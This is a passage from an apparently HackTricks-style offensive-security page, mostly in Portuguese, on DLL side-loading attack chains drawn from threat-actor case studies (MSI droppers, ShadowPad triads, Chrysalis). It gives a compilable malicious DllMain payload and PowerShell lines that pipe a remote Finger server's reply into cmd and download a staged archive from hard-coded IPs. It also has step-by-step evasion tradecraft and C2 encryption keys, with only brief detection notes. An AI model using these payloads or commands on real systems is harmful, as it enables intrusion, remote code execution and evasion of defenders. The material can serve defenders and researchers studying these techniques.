## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads sob um processo confiável e assinado.

Visão geral da cadeia
- O usuário baixa o MSI. Um CustomAction é executado silenciosamente durante a instalação GUI (por exemplo, LaunchApplication ou uma ação VBScript), reconstruindo a próxima etapa a partir de resources embutidos.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (par EXE assinado pela Avast `wsc_proxy.exe` + `wsc.dll` controlada pelo atacante).
- Quando o EXE assinado é iniciado, a ordem de busca de DLLs do Windows carrega `wsc.dll` primeiro a partir do diretório de trabalho, executando o código do atacante sob um parent assinado (ATT&CK T1574.001).

Análise do MSI (o que procurar)
- Tabela CustomAction:
- Procure entradas que executem executables ou VBScript. Exemplo de padrão suspeito: LaunchApplication executando um arquivo embutido em background.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Payloads embutidos/divididos no CAB do MSI:
- Extração administrativa: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Ou use lessmsi: `lessmsi x package.msi C:\out`
- Procure vários fragmentos pequenos que são concatenados e descriptografados por uma VBScript CustomAction. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Drop these two files in the same folder:
- wsc_proxy.exe: host assinado legítimo (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: DLL do atacante. Se nenhum export específico for exigido, DllMain pode ser suficiente; caso contrário, construa uma proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa o payload em DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportação, use um proxying framework (por exemplo, DLLirant/Spartacus) para gerar uma forwarding DLL que também execute seu payload.

- Esta technique depende da resolução do nome da DLL pelo host binary. Se o host usar absolute paths ou safe loading flags (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS e forwarded exports podem influenciar a precedência e devem ser considerados durante a seleção do host binary e do export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point descreveu como Ink Dragon implanta ShadowPad usando uma **three-file triad** para se misturar com software legítimo enquanto mantém o core payload encrypted no disco:

1. **Signed host EXE** – vendors como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os attackers renomeiam o executable para parecer um Windows binary (por exemplo `conhost.exe`), mas a Authenticode signature permanece válida.
2. **Malicious loader DLL** – dropped ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um MFC binary obfuscated com o framework ScatterBrain; seu único trabalho é localizar o encrypted blob, decrypt it, e mapear ShadowPad de forma reflective.
3. **Encrypted payload blob** – frequentemente armazenado como `<name>.tmp` no mesmo diretório. Após fazer memory-mapping do decrypted payload, o loader deleta o arquivo TMP para destruir evidência forense.

Notas de tradecraft:

* Renomear o signed EXE (mantendo o `OriginalFileName` original no PE header) permite que ele se passe por um Windows binary e ainda retenha a vendor signature, então replique o hábito do Ink Dragon de soltar binaries com aparência de `conhost.exe` que na verdade são utilitários AMD/NVIDIA.
* Como o executable continua trusted, a maioria dos controles de allowlisting só precisa que sua malicious DLL fique ao lado dele. Foque em customizar a loader DLL; o signed parent normalmente pode rodar sem alterações.
* O decryptor do ShadowPad espera que o TMP blob esteja ao lado do loader e seja writable, para que ele possa zerar o arquivo após o mapping. Mantenha o diretório writable até o payload carregar; uma vez em memória, o arquivo TMP pode ser apagado com segurança para OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators combinam DLL sideloading com LOLBAS para que o único artifact customizado em disco seja a malicious DLL ao lado do trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell inicia `cmd.exe /c`, obtém comandos de um Finger server e os envia para `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtém texto via TCP/79; `| cmd` executa a resposta do server, permitindo que os operators alternem o second stage no lado do servidor.

- **Built-in download/extract:** Baixe um archive com uma extensão benign, descompacte-o e prepare o sideload target junto com a DLL em uma pasta aleatória em `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta o progresso e segue redirects; `tar -xf` usa o tar embutido do Windows.

- **WMI/CIM launch:** Inicie o EXE via WMI para que a telemetria mostre um processo criado via CIM enquanto ele carrega a DLL colocada no mesmo diretório:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona com binaries que preferem DLLs locais (por exemplo, `intelbq.exe`, `nearby_share.exe`); o payload (por exemplo, Remcos) roda sob o trusted name.

- **Hunting:** Alerta para `forfiles` quando `/p`, `/m` e `/c` aparecem juntos; incomum fora de admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma trusted update chain para entregar um NSIS-packed dropper que preparou um DLL sideload mais payloads totalmente in-memory.

Tradecraft flow
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca como **HIDDEN**, solta um renamed Bitdefender Submission Wizard `BluetoothService.exe`, uma malicious `log.dll`, e um encrypted blob `BluetoothService`, então inicia o EXE.
- O host EXE importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` faz mmap-load do blob; `LogWrite` o decrypta com um custom LCG-based stream (constantes **0x19660D** / **0x3C6EF35F**, key material derivado de um hash anterior), sobrescreve o buffer com plaintext shellcode, libera os temporários e salta para ele.
- Para evitar uma IAT, o loader resolve APIs fazendo hash dos export names usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, depois aplicando uma Murmur-style avalanche (**0x85EBCA6B**) e comparando com salted target hashes.

Main shellcode (Chrysalis)
- Decrypta um PE-like main module repetindo add/XOR/sub com a key `gQ2JR&9;` em cinco passes, então carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para finalizar a import resolution.
- Reconstrói strings de nomes de DLL em runtime por meio de transforms de per-character bit-rotate/XOR, depois carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre o **PEB → InMemoryOrderModuleList**, analisa cada export table em blocos de 4 bytes com Murmur-style mixing e só recorre a `GetProcAddress` se o hash não for encontrado.

Embedded configuration & C2
- A config fica dentro do arquivo `BluetoothService` dropado, no **offset 0x30808** (size **0x980**) e é RC4-decrypted com a key `qwhvb^435h&*7`, revelando a URL do C2 e o User-Agent.
- Beacons constroem um host profile separado por pontos, adicionam o tag `4Q`, depois RC4-encrypt com a key `vAuig34%^325hGV` antes de `HttpSendRequestA` via HTTPS. As responses são RC4-decrypted e despachadas por um tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- O modo de execução é controlado por CLI args: sem args = install persistence (service/Run key) apontando para `-i`; `-i` reinicia a si mesmo com `-k`; `-k` pula a instalação e executa o payload.

Alternate loader observed
- A mesma intrusão dropou Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O C source fornecido pelo attacker embutiu shellcode, compilou e executou in-memory sem tocar o disco com um PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compile-and-run baseada em TCC importou `Wininet.dll` em runtime e puxou uma shellcode de segunda etapa de uma URL hardcoded, oferecendo um loader flexível que se passava por uma execução de compiler.

## Signed-host sideloading com export proxying + host thread parking

Algumas cadeias de DLL sideloading adicionam **stability engineering** para que o host legítimo permaneça vivo tempo suficiente para carregar as próximas etapas de forma limpa, em vez de travar depois que a DLL maliciosa é carregada.

Padrão observado
- Solte um EXE confiável ao lado de uma DLL maliciosa usando o nome de dependência esperado, como `version.dll`.
- A DLL maliciosa **faz proxy de cada export esperado** para a DLL real do sistema (por exemplo `%SystemRoot%\\System32\\version.dll`), de modo que a resolução de imports continue funcionando e o processo host siga operando.
- Após o load, a DLL maliciosa **faz patch do entry point do host** para que a thread principal caia em um loop infinito de `Sleep` em vez de sair ou executar caminhos de código que terminariam o processo.
- Uma nova thread executa o trabalho malicioso real: descriptografar o nome ou path da DLL da próxima etapa (RC4/XOR são comuns) e então carregá-la com `LoadLibrary`.

Por que isso importa
- O proxying normal de DLL preserva a compatibilidade de API, mas não garante que o host permaneça vivo tempo suficiente para as etapas posteriores.
- Manter a thread principal em `Sleep(INFINITE)` é uma forma simples de manter o processo assinado residente enquanto o loader executa descriptografia, staging ou bootstrap de rede em uma worker thread.
- Procurar apenas um `DllMain` suspeito pode deixar passar esse padrão se o comportamento interessante acontecer depois que o entry point do host é alterado e uma thread secundária é iniciada.

Fluxo mínimo
1. Copie o EXE host assinado e determine a DLL que ele resolve no diretório local.
2. Construa uma DLL proxy exportando as mesmas funções e encaminhando-as para a DLL legítima.
3. Em `DllMain(DLL_PROCESS_ATTACH)`, crie uma worker thread.
4. A partir dessa thread, faça patch do entry point do host ou da rotina de início da thread principal para que ela fique em loop com `Sleep`.
5. Descriptografe o nome/config da DLL da próxima etapa e chame `LoadLibrary` ou faça manual-map do payload.

Pontos de defesa
- Processos assinados carregando `version.dll` ou bibliotecas semelhantes e comuns do próprio diretório da aplicação em vez de `System32`.
- Patches de memória no entry point do processo logo após o image load, especialmente jumps/calls redirecionados para `Sleep`/`SleepEx`.
- Threads criadas por uma DLL proxy que imediatamente chamam `LoadLibrary` em uma segunda DLL com um nome descriptografado.
- DLLs proxy de full-export colocadas ao lado de executáveis de vendor em diretórios de staging graváveis, como `ProgramData`, `%TEMP%` ou paths de archive descompactados.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
